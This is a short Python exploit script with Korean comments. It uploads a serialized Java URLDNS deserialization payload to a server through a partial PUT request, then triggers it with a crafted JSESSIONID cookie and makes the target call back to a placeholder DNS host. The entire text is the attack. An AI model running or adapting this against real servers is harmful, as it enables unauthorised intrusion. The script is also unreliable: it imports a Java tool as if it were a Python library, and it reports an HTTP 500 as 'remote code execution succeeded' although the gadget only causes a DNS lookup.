import requests
from ysoserial import URLDNS  # ysoserial 라이브러리 필요

target = "http://localhost:8080"

# 1. 악성 직렬화 페이로드 생성 (URLDNS 가젯)
payload = URLDNS().generate("http://your-dns-server.example")

# 2. 부분 PUT 요청으로 세션 파일 업로드
put_url = f"{target}/deserialize/session"
headers = {
    "Content-Range": "bytes 0-{}/{}".format(len(payload)-1, len(payload))
}
response = requests.put(
    put_url,
    data=payload,
    headers=headers
)

if response.status_code in [200, 201, 409]:
    print("[+] 악성 세션 파일 업로드 성공")
    
    # 3. JSESSIONID를 통한 트리거
    cookies = {"JSESSIONID": ".deserialize"}
    trigger = requests.get(f"{target}/", cookies=cookies)
    
    if trigger.status_code == 500:
        print("[+] 원격 코드 실행 성공 (DNS 요청 확인)")
    else:
        print("[-] 실행 실패: 서버 구성 확인 필요")
else:
    print("[-] 파일 업로드 실패:", response.status_code)
